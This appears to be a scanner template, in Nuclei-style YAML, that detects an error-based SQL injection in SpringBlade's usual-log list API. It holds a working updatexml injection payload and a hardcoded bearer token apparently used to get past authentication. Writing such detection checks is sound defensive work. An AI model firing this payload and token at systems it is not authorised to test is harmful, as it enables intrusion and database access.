id: poc-yaml-springblade-usual-sqli
info:
  name: SpringBlade Usual SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
variables:
  t1: '{{rand_int(1000,10000)}}'
  t2: '{{md5(t1)}}'
http:
  - raw:
      - |
        GET /api/blade-log/usual/list?updatexml(1,concat(0x7e,md5({{t1}}),0x7e),1)=1 HTTP/1.1
        Host: {{Hostname}}
        Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "XPATH syntax error"
          - "{{substr(t2,0,31)}}"
      - type: word
        part: header
        words:
          - "application/json"
